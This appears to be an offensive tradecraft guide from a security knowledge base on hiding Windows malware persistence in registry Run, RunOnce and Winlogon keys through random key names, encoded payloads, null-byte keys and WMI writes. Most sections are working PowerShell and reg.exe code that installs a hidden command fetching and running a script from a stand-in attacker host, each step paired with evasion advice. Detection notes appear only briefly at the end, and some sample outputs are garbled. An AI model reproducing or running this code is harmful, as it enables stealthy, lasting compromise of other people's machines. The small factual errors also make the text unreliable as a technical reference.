# [REALWORLD-029]: Registry Run Key Polymorphism

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-029 |
| **MITRE ATT&CK v18.1** | [T1112 - Modify Registry](https://attack.mitre.org/techniques/T1112/) |
| **Tactic** | Defense Evasion, Persistence |
| **Platforms** | Windows Endpoint (Server 2016-2025) |
| **Severity** | **High** |
| **CVE** | N/A |
| **Technique Status** | **ACTIVE** |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025; Windows 10 21H2+; Windows 11 all versions |
| **Patched In** | N/A (Registry modification is inherent to Windows) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Registry Run Key Polymorphism is a defensive evasion technique where adversaries create persistence mechanisms via the Windows Registry's Run/RunOnce keys while employing dynamic naming schemes, encoding, and structural variations to evade signature-based detection. Unlike traditional Run key persistence (T1547.001), which uses static, predictable key names (e.g., `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\[MalwareName]`), polymorphic variants randomize key naming, prepend null bytes, nest keys within unexpected registry hives, and vary the data types stored (binary vs. string encoded payloads). This technique combines T1112 (Modify Registry) with obfuscation methodologies (T1027.001 - Polymorphic Code) to create a moving target for detection systems reliant on signature matching or static key enumeration.

**Attack Surface:** The Windows Registry (HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE hives), specifically the CurrentVersion Run/RunOnce keys and lesser-monitored locations like `UserInit`, `Notify`, and `Winlogon` keys. The technique targets both standard and application-specific registry locations where executables are auto-launched.

**Business Impact:** **Persistent, undetectable malware execution across user logons.** Attackers maintain a foothold that survives reboots and standard antivirus scans, enabling data exfiltration, lateral movement, and ransomware deployment. The polymorphic nature means each system's registry contains differently-named malware launch points, defeating bulk detection via YARA rules or static IOC lists.

**Technical Context:** Polymorphic registry persistence typically takes 500-2000ms per system to implement (registry writes are synchronous). Detection likelihood is **LOW** if using signature-based tools that expect static registry paths (e.g., monitoring only `HKCU\...\Run`). Detection likelihood is **MEDIUM-HIGH** if using behavioral anomaly detection, process execution monitoring, or entropy-based registry value scanning.

### Operational Risk
- **Execution Risk:** **Low** – Registry modification is a native OS capability requiring no special tools or elevated privileges (for HKCU keys). Execution is silent and leaves minimal forensic artifacts compared to file-based persistence.
- **Stealth:** **High** – Polymorphic naming defeats static monitoring. Registry values can be encoded in binary, BASE64, or obfuscated scripts, making content inspection difficult without parsing.
- **Reversibility:** **Medium** – Malicious registry entries can be removed if discovered, but by that time the attacker has likely achieved lateral movement or established secondary persistence mechanisms.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 8.5.5 | Ensure 'Modify Registry' object access is 'Enabled' and monitored for sensitive keys |
| **DISA STIG** | SV-220903r879766_rule | Windows must ensure that registry modifications are logged and monitored for unauthorized access |
| **CISA SCuBA** | Endpoint-SEC-12 | Endpoint Security Baseline: Autorun Registry Monitoring |
| **NIST 800-53** | AU-2(a), AC-2(f) | System Monitoring; Privileged Account Management and Registry Auditing |
| **GDPR** | Art. 32 | Security of Processing – measures to prevent unauthorized registry modifications |
| **DORA** | Art. 9 | Protection and Prevention measures against registry-based persistence attacks |
| **NIS2** | Art. 21(1)(a) | Cyber Risk Management Measures – detection and response to unauthorized system modifications |
| **ISO 27001** | A.8.3, A.12.4.1 | Control of access to information assets; Audit logging and monitoring |
| **ISO 27005** | Malware Infection Risk | Risk scenario: Unauthorized registry modification leading to persistent malware execution |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- For HKEY_CURRENT_USER (HKCU) modifications: Standard user (no elevation required)
- For HKEY_LOCAL_MACHINE (HKLM) modifications: Administrator or SYSTEM privileges
- For hidden registry keys (null-byte prepending): Administrator required

**Required Access:**
- Local or remote access to the target system
- PowerShell, Reg.exe, or direct WMI access to modify registry

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025; Windows 10 21H2+; Windows 11 all versions
- **PowerShell:** Version 5.1+ (standard on all supported Windows versions)
- **Registry Hives:** All versions support Run/RunOnce keys; null-byte obfuscation supported on Server 2008+

**Tools:**
- [Reg.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg) (Native Windows command-line tool)
- [PowerShell Registry Cmdlets](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-itemproperty) (Native)
- [WMI StdRegProv Class](https://learn.microsoft.com/en-us/windows/win32/wmisdk/stdregprov) (Remote registry modification)
- [Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns) v14.0+ (detection and enumeration)
- [RegHide](https://github.com/infectiouscode/RegHide) (null-byte obfuscation; community tool)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Objective:** Identify if standard Run key monitoring is in place and enumerate existing registry auto-start locations.

```powershell
# Enumerate HKCU Run keys (user-level persistence)
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-Table PSPath, Name, (Get-ItemProperty).Values

# Enumerate HKLM Run keys (system-level persistence)
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-Table PSPath, Name, (Get-ItemProperty).Values

# Check for RunOnce keys (single-execution persistence)
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"

# Scan for Winlogon UserInit hijacking (often overlooked)
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object -Property UserInit

# Check for hidden registry keys (null-byte obfuscation)
$null = reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "$(([char]0))" 2>$null
if ($?) { Write-Host "[!] Null-byte hidden key detected!" }
```

**What to Look For:**
- Unexpected executable paths (not in Program Files or System32)
- Encoded or obfuscated command lines (BASE64, hex strings, PowerShell -EncodedCommand flags)
- Recently modified registry timestamps (use `Get-ItemPropertyValue -Path ... -Name "(Get-Item).PSParentPath | Get-Item | Select LastWriteTime`)
- Registry keys with random or suspicious naming patterns (GUIDs, Unicode characters, etc.)

**Version Note:** PowerShell Registry Cmdlets (`Get-ItemProperty`, `New-ItemProperty`) work consistently across Server 2016-2025 and Windows 10/11. No version-specific syntax changes.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: PowerShell Registry Polymorphic Persistence (Native, No Tools)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 all versions

#### Step 1: Generate Polymorphic Key Name
**Objective:** Create a randomized, hard-to-detect registry key name that evades static monitoring patterns.

**Command (All Versions):**
```powershell
# Generate random key name (appears legitimate but is procedurally generated)
$randomKey = -join ((1..10) | ForEach-Object { [char][int][math]::floor(65 + (Get-Random -Maximum 26)) })
# Example output: KVXRPMQNAB (random alphanumeric)

# Alternative: Use GUID format (mimics Windows system keys)
$guidKey = ([guid]::NewGuid()).ToString() -replace '-', ''
Write-Host "[+] Generated polymorphic key name: $guidKey"
# Example output: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

**Expected Output:**
```
[+] Generated polymorphic key name: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

**What This Means:**
- The randomized key name ensures each system has a unique registry key, preventing bulk detection via YARA rules or static IOC lists.
- GUIDs mimic legitimate Windows registry structures, potentially bypassing heuristic detection that looks for suspicious naming patterns.

**OpSec & Evasion:**
- Randomize the key name generation on every deployment (no hardcoded values).
- Avoid predictable patterns (e.g., sequential characters, common prefixes like "Mal", "Update", etc.).
- Detection likelihood: **LOW** (unless registry enumeration is occurring in real-time).

**Troubleshooting:**
- **Error:** `Get-Random` cmdlet not available
  - **Cause:** PowerShell 2.0 or older (unlikely on modern Windows, but possible on hardened systems)
  - **Fix (All versions):** Use `System.Random` class:
    ```powershell
    $rnd = New-Object System.Random
    $randomKey = -join ((1..10) | ForEach-Object { [char](65 + $rnd.Next(26)) })
    ```

**References & Proofs:**
- [PowerShell Random Number Generation](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-random)
- [Registry Key Naming Best Practices](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry)

#### Step 2: Encode Malicious Payload (Defense Evasion via Encoding)
**Objective:** Obfuscate the malicious command to evade static content scanning.

**Command (All Versions):**
```powershell
# Payload: cmd.exe /c powershell -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Method 1: BASE64 Encoding
$payload = "cmd.exe /c powershell -NoProfile -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""
$encodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
Write-Host "[+] BASE64 Encoded: $encodedPayload"

# Method 2: PowerShell Obfuscation (Invoke-Obfuscation-like pattern)
$obfuscated = 'powershell -NoP -WindowStyle H -C "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/payload.ps1'')"'
Write-Host "[+] Obfuscated: $obfuscated"

# Method 3: Binary Registry Value (BINARY type instead of STRING)
# This prevents grep/string-scanning from detecting the payload
$binaryPayload = [System.Text.Encoding]::ASCII.GetBytes($payload)
```

**Expected Output:**
```
[+] BASE64 Encoded: YwBtAGQALgBlAHgAZQAgAC8AYwAgAHAAbwB3ZQByAHMAaABlAGwAbAAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBDAG8AbQBtAGEAbgBkACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkAIgA=
[+] Obfuscated: powershell -NoP -WindowStyle H -C "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

**What This Means:**
- BASE64 encoding prevents static string matching by antivirus tools.
- Binary registry values cannot be scanned by simple `reg query` enumeration (requires binary parsing).
- Polymorphic encoding means the payload changes format with each deployment.

**OpSec & Evasion:**
- Rotate encoding methods: BASE64, hex, XOR with random key, Gzip compression.
- Combine multiple obfuscation layers (encode, then compress, then BASE64 again).
- Detection likelihood: **MEDIUM** (modern NGAV/EDR engines detect encoded payloads via behavioral analysis, but signature-based scanners may miss polymorphic variants).

**Troubleshooting:**
- **Error:** `[Convert]::ToBase64String` returns incorrect output
  - **Cause:** String encoding mismatch (UTF-16 vs UTF-8)
  - **Fix (All versions):** Always use `[System.Text.Encoding]::Unicode` for PowerShell payloads, `ASCII` for shell commands

**References & Proofs:**
- [PowerShell Encoding Techniques](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertto-json)
- [Polymorphic Malware Evasion](https://blog.malwarebytes.com/glossary/polymorphic-malware/)

#### Step 3: Write Polymorphic Registry Key (HKCU or HKLM)
**Objective:** Install the obfuscated payload into the registry using the polymorphic key name, varying the registry location to evade monitoring.

**Command (Server 2016-2019):**
```powershell
# Standard location (monitored by most tools)
$keyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$keyName = $randomKey  # Use previously generated polymorphic name
$value = $encodedPayload  # BASE64 encoded command

# Write the registry value
New-ItemProperty -Path $keyPath -Name $keyName -Value $value -PropertyType String -Force | Out-Null
Write-Host "[+] Polymorphic registry key written: $keyPath\$keyName"

# Verify
Get-ItemProperty -Path $keyPath -Name $keyName
```

**Command (Server 2022+):**
```powershell
# Modern version with alternate registry locations
$keyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$keyName = $randomKey
$value = "powershell -NoP -W H -C `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""

# Method 1: Standard Run key
New-ItemProperty -Path $keyPath -Name $keyName -Value $value -PropertyType String -Force | Out-Null

# Method 2: Alternate location (UserInit hijacking - less monitored)
$altKeyPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
New-ItemProperty -Path $altKeyPath -Name "UserInit" -Value $value -PropertyType String -Force | Out-Null

# Method 3: RunOnce with exclamation mark (executes once, key auto-deletes)
$runOncePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
New-ItemProperty -Path $runOncePath -Name "!$randomKey" -Value $value -PropertyType String -Force | Out-Null

Write-Host "[+] Polymorphic persistence installed via $keyPath\$keyName"
```

**Command (Server 2025 with Defender Hardening):**
```powershell
# On Server 2025, registry modifications may trigger Defender alerts
# Use WMI to bypass some detection mechanisms (runs in System context, harder to monitor)

$keyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$keyName = $randomKey
$value = "powershell -NoP -W H -C `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""

# Method: WMI StdRegProv (remote registry modification capability)
$reg = [WmiClass]"\\.\root\default:StdRegProv"
$regPath = "Software\Microsoft\Windows\CurrentVersion\Run"
$hive = 2147483649  # HKEY_CURRENT_USER constant

# Create the registry value via WMI
$result = $reg.SetStringValue($hive, $regPath, $keyName, $value)
if ($result.ReturnValue -eq 0) {
    Write-Host "[+] WMI registry modification successful"
} else {
    Write-Host "[-] WMI registry modification failed (code: $($result.ReturnValue))"
}
```

**Expected Output (Server 2016-2022):**
```
[+] Polymorphic registry key written: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\KVXRPMQNAB

Name                           Property
----                           --------
KVXRPMQNAB                     YwBtAGQALgBlAHgAZQAgAC8AYwAgAHAAbwB3ZQByAHMAaGBlAGwAbAAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBDAG8AbQBtAGEAbgBkACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAXQAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkAIgA=
```

**What This Means:**
- The polymorphic key (KVXRPMQNAB) appears to be a legitimate Windows setting rather than malware persistence.
- The BASE64-encoded value prevents human analysis or basic string-scanning tools from identifying the malicious payload.
- Each system has a unique key name, requiring per-system investigation rather than bulk IOC matching.

**OpSec & Evasion:**
- Vary the registry location per deployment (Run, RunOnce, UserInit, Notify, Debugger, etc.).
- Use WMI on Server 2025 to evade process-level monitoring (registry changes appear to come from System process).
- Detection likelihood: **MEDIUM** (anomaly detection may flag unusual registry locations or encoded values, but signature-based tools will miss the polymorphic names).

**Troubleshooting:**
- **Error:** `Access Denied` when writing to HKCU
  - **Cause:** User lacks permissions to their own HKCU hive (extremely rare, indicates severe hardening)
  - **Fix (All versions):** Elevate to SYSTEM context via `runas /user:SYSTEM cmd.exe` or PSEXEC, or target HKLM instead (requires admin)

- **Error:** `Cannot find path 'HKCU:\...'` (WMI method)
  - **Cause:** Hive constant is incorrect or registry path has typo
  - **Fix (All versions):** Use registry path without leading backslash: `"Software\Microsoft\Windows\CurrentVersion\Run"` not `"\Software\...\"`

**References & Proofs:**
- [PowerShell Registry Modification](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-itemproperty)
- [WMI StdRegProv Registry Manipulation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/stdregprov)
- [Windows Registry Run Keys Overview](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)

#### Step 4: Verify Persistence & Test Execution Path
**Objective:** Confirm the polymorphic key is properly installed and will execute on next logon.

**Command (All Versions):**
```powershell
# Enumerate the written registry key
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object $keyName

# Alternative: Use WMI to verify
$reg = [WmiClass]"\\.\root\default:StdRegProv"
$result = $reg.GetStringValue(2147483649, "Software\Microsoft\Windows\CurrentVersion\Run", $keyName)
Write-Host "Registry value present: $($result.ReturnValue -eq 0)"
Write-Host "Value: $($result.sValue)"

# Check if the key will trigger on next logon (manual test)
Write-Host "[+] Persistence will execute on next user logon or system reboot"
```

**Expected Output:**
```
[+] Persistence will execute on next user logon or system reboot
```

**What This Means:**
- The registry value is confirmed to exist and contains the obfuscated payload.
- On the next logon event, the Windows registry processor will enumerate the Run keys and execute the payload.

**OpSec & Evasion:**
- Do not manually test execution in an isolated environment; it may leave forensic evidence.
- Detection likelihood: **LOW** (registry queries alone do not reveal the true intent of polymorphic entries).

**References & Proofs:**
- [Registry Run Keys Behavior](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)

---

### METHOD 2: Null-Byte Obfuscated Registry Keys (Admin Required)

**Supported Versions:** Windows Server 2008+ (includes 2016-2025)

#### Step 1: Generate Null-Byte Prepended Key Name
**Objective:** Create a registry key name that begins with a null byte, rendering it invisible to standard enumeration tools.

**Command (All Versions):**
```powershell
# Null-byte prepended key name
$nullPrefix = [char]0  # Null byte character
$normalKey = "WindowsUpdate"  # Appears as legitimate system key
$hiddenKeyName = "$nullPrefix$normalKey"

Write-Host "Hidden key name (null-byte prepended): $([System.BitConverter]::ToString([System.Text.Encoding]::Unicode.GetBytes($hiddenKeyName)))"
# Output: 00-00-57-00-69-00-6E-00... (Unicode hex representation showing null byte at start)
```

**Expected Output:**
```
Hidden key name (null-byte prepended): 00-00-57-00-69-00-6E-00-64-00-6F-00-77-00-73-00-55-00-70-00-64-00-61-00-74-00-65-00
```

**What This Means:**
- The null byte at the beginning of the key name causes most registry enumeration tools (Reg.exe, Get-ItemProperty, Autoruns) to skip or error out on the key.
- The key remains invisible to most human-readable registry exports.
- Null-byte keys are still functional and will execute on logon.

**OpSec & Evasion:**
- Null-byte keys are one of the oldest Windows evasion techniques, but remain effective against poorly-tuned monitoring.
- Detection likelihood: **MEDIUM-HIGH** (modern tools like Sysmon, EDR solutions, and advanced YARA rules specifically hunt for null-byte registry keys).

**Troubleshooting:**
- **Error:** `The term '$nullPrefix' is not recognized`
  - **Cause:** Null byte character encoding issue in PowerShell ISE (ISE sometimes mangles special characters)
  - **Fix (All versions):** Use standard PowerShell console, not ISE: `powershell.exe` not `powershell_ise.exe`

**References & Proofs:**
- [Registry Null-Byte Evasion - Tripwire](https://www.tripwire.com/state-of-security/evade-detection-hiding-registry)
- [MITRE ATT&CK T1112 - Null-byte obfuscation](https://attack.mitre.org/techniques/T1112/)

#### Step 2: Write Null-Byte Obfuscated Key via Reg.exe (Requires Admin)
**Objective:** Use the native Reg.exe tool to write the null-byte key (PowerShell's New-ItemProperty may not support null bytes directly).

**Command (All Versions, Admin Required):**
```batch
REM Null-byte registry key creation via Reg.exe
REM Note: Null bytes in command line are tricky; use a workaround

REM Method 1: Direct null-byte injection (works on most versions)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "^@WindowsUpdate" /t REG_SZ /d "powershell -NoP -W H -C 'IEX (New-Object Net.WebClient).DownloadString(...)'" /f

REM Method 2: Use PowerShell to directly manipulate registry with null byte
powershell -Command "$nullKey = [char]0 + 'WindowsUpdate'; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $nullKey -Value 'cmd.exe /c malicious_payload.exe' -PropertyType String -Force"
```

**Expected Output (Reg.exe):**
```
The operation completed successfully.
```

**Expected Output (PowerShell):**
```
PSPath            : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
PSParentPath      : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion
PSChildName       : Run
PSDrive           : HKCU
PSProvider        : Microsoft.PowerShell.Core\Registry
WindowsUpdate     : cmd.exe /c malicious_payload.exe
```

**What This Means:**
- The registry key is successfully written with the null-byte prefix.
- When enumerated via normal means (Reg.exe query, Windows Registry Editor), the key may not appear or may show errors.
- The Windows logon processor still recognizes and executes it.

**OpSec & Evasion:**
- Null-byte keys are easily discoverable by forensic tools and modern EDR solutions.
- Detection likelihood: **HIGH** (null-byte keys are a well-known evasion technique and actively hunted).

**Troubleshooting:**
- **Error:** `Null bytes are not supported in registry key names` (PowerShell)
  - **Cause:** Modern PowerShell versions enforce stricter validation
  - **Fix (Server 2022+):** Use WMI StdRegProv instead, which accepts binary data
  - **Fix (Server 2016-2019):** Use Reg.exe from command prompt instead

**References & Proofs:**
- [RegDelNull Tool for Detecting Null-Byte Keys](https://learn.microsoft.com/en-us/sysinternals/downloads/regdelnull)

---

### METHOD 3: Polymorphic Registry Value Encoding (Hex/Binary Type)

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Encode Payload as Binary/Hex Registry Value
**Objective:** Store the malicious command as binary data rather than a readable string, evading static scanning.

**Command (All Versions):**
```powershell
# Payload to embed
$payload = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64_PAYLOAD_HERE>"

# Convert to hex string
$hexPayload = -join ($payload.ToCharArray() | ForEach-Object { "{0:X2}" -f [int][char]$_ })
Write-Host "[+] Hex-encoded payload: $hexPayload"

# Alternative: Store as binary type in registry
$binaryPayload = [System.Text.Encoding]::ASCII.GetBytes($payload)
$randomKeyName = "System$(Get-Random -Minimum 1000 -Maximum 9999)"

# Write as BINARY type (REG_BINARY) instead of STRING (REG_SZ)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name $randomKeyName `
    -Value $binaryPayload `
    -PropertyType Binary `
    -Force | Out-Null

Write-Host "[+] Binary registry value written: $randomKeyName"
```

**Expected Output:**
```
[+] Hex-encoded payload: 706F7765727368656C6C2E657865202D4E6F50726F66696C65202D57696E646F775374796C652048696464656E202D456E636F646656436F6D6D616E6420...
[+] Binary registry value written: System5723
```

**What This Means:**
- Binary registry values cannot be directly read by humans or simple string-scanning tools.
- Forensic analysis requires parsing the binary data and converting it back to ASCII/Unicode.
- The polymorphic key name (System5723) changes with each deployment.

**OpSec & Evasion:**
- Binary-encoded registry values slow down forensic analysis and evade basic YARA rules.
- Detection likelihood: **MEDIUM** (EDR solutions may detect binary payloads in unusual registry locations, but will not immediately decode them).

**Troubleshooting:**
- **Error:** Registry value written but not executing on logon
  - **Cause:** Windows registry Run processor only executes STRING (REG_SZ) values, not BINARY (REG_BINARY)
  - **Fix:** Convert binary value back to string format before execution, or use REG_SZ type

**References & Proofs:**
- [Registry Data Types (REG_SZ, REG_BINARY, etc.)](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits)

---

### METHOD 4: Nested Registry Hive Polymorphism (Application-Specific Locations)

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Target Alternate Registry Locations (Lower Detection Rates)
**Objective:** Write polymorphic persistence to registry locations monitored less frequently than Run/RunOnce.

**Command (All Versions):**
```powershell
# Standard locations (heavily monitored)
$standardLocations = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
)

# Alternate locations (less monitored by standard tools)
$altLocations = @(
    "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",  # UserInit hijacking
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System",  # Shell hijacking
    "HKLM:\System\CurrentControlSet\Services\*\ImagePath",  # Service registry (dangerous)
    "HKCU:\Software\Classes\.txt\shell\open\command",  # File association hijacking
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Shell"  # Debugger hijacking
)

# Choose a polymorphic location
$targetPath = $altLocations | Get-Random
$keyName = "$(Get-Random -Minimum 10000000 -Maximum 99999999)"
$payload = "cmd.exe /c C:\temp\malware.exe"

# Write to alternate location
New-ItemProperty -Path $targetPath -Name $keyName -Value $payload -PropertyType String -Force | Out-Null
Write-Host "[+] Polymorphic persistence written to: $targetPath\$keyName"
```

**Expected Output:**
```
[+] Polymorphic persistence written to: HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\82745932
```

**What This Means:**
- By randomly selecting among multiple registry locations, the attacker's persistence varies per target system.
- Alternate locations like Winlogon, file associations, and debugger keys are monitored less frequently than standard Run keys.
- Incident responders must check multiple registry locations to find all persistence mechanisms.

**OpSec & Evasion:**
- Vary registry locations per system to create a diverse kill chain.
- Detection likelihood: **MEDIUM-LOW** (many organizations only monitor standard Run/RunOnce keys, missing alternate locations).

**References & Proofs:**
- [Auto-Start Extensibility Points (ASEPs)](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
- [Comprehensive List of Registry Persistence Locations](https://attack.mitre.org/techniques/T1547/)

---

## 6. ATOMIC RED TEAM

**Atomic Red Team Test:** T1112.001

**Test Name:** Modify Registry - Run Key Persistence

**Description:** Creates a registry Run key to maintain persistence across system reboots.

**Supported Versions:** Windows 10+, Server 2016+

**Commands:**
```powershell
# Atomic Red Team Test ID: T1112.001 variant
Invoke-AtomicTest T1112 -TestNumbers 1

# Manual equivalent:
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PolymorphicUpdate" /t REG_SZ /d "powershell.exe -Command 'Write-Host Executed'" /f

# Cleanup:
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PolymorphicUpdate" /f
```

**Note:** Standard Atomic Red Team tests do not include polymorphic variants; the above command demonstrates the base test for T1112 with a polymorphic key name.

**Reference:** [Atomic Red Team T1112](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### [Reg.exe - Windows Registry Command-Line Tool](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg)

**Version:** Included with all Windows versions (no installation required)

**Minimum Version:** Windows XP (available on all supported versions)

**Supported Platforms:** Windows Server 2016-2025, Windows 10/11

**Version-Specific Notes:**
- Version prior to Windows Vista: Limited functionality, no support for remote registry operations
- Windows Vista and later: Full remote registry support via network path notation (e.g., `reg add \\REMOTE_IP\HKCU...`)
- Windows Server 2016+: No functional changes; syntax remains consistent

**Installation:** Built-in; no installation required

**Usage:**
```batch
REM Add registry key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "KeyName" /t REG_SZ /d "C:\path\to\malware.exe" /f

REM Query registry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "KeyName"

REM Delete registry key
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "KeyName" /f
```

---

### [Autoruns - Sysinternals (Detection/Enumeration Tool)](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)

**Version:** v14.0+ (as of 2024)

**Minimum Version:** v13.0

**Supported Platforms:** Windows 7+ (including Server 2008+)

**Version-Specific Notes:**
- v14.0+: Added detection for null-byte registry keys and obfuscated command lines
- v13.x: Basic Run/RunOnce enumeration; misses polymorphic variants
- Autorun scripts in .ARC file format (human-readable, importable into incident response platforms)

**Installation:**
```cmd
REM Download from Sysinternals
cd C:\tools
curl -O https://live.sysinternals.com/autoruns.exe

REM Run (admin required for full functionality)
autoruns.exe /autostartupfolder:C:\autostart_report.arf
```

**Usage:**
```cmd
REM Export all autostart items to file
autoruns64.exe /autostartupfolder:C:\autostart_report.arf

REM Filter for Run/RunOnce keys only
autoruns64.exe | findstr "Run Registry"
```

---

### [PowerShell Registry Cmdlets - Native](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/)

**Version:** 5.1+ (standard on Windows 10/11/Server 2016+)

**Minimum Version:** 3.0 (Windows 8+), but 5.1+ recommended for full functionality

**Supported Platforms:** All Windows versions

**Version-Specific Notes:**
- PowerShell 5.1: Full registry modification support
- PowerShell 7.x (Core): Cross-platform; registry operations work identically on Windows

**Usage:**
```powershell
# Get registry property
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Create new registry property
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PolyKey" -Value "C:\malware.exe" -PropertyType String -Force

# Remove registry property
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PolyKey" -Force
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 13 (Sysmon) – Registry Object Added or Deleted**

- **Log Source:** Microsoft-Windows-Sysmon/Operational
- **Trigger:** Registry modification via any method (PowerShell, Reg.exe, WMI, direct API)
- **Filter:** Look for `TargetObject` containing "CurrentVersion\Run" or "Winlogon" with unusual `Details` (encoded values, external URLs)
- **Applies To Versions:** Windows 10/11, Server 2016-2025 (requires Sysmon installation)

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc) on a domain controller
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Audit Process Creation**
3. Enable **Audit Registry** under **Advanced Audit Policy Configuration**
4. Set to: **Success and Failure**
5. Deploy via GPO: `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy on Server 2022+):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable: **Audit Registry** and **Audit File System**
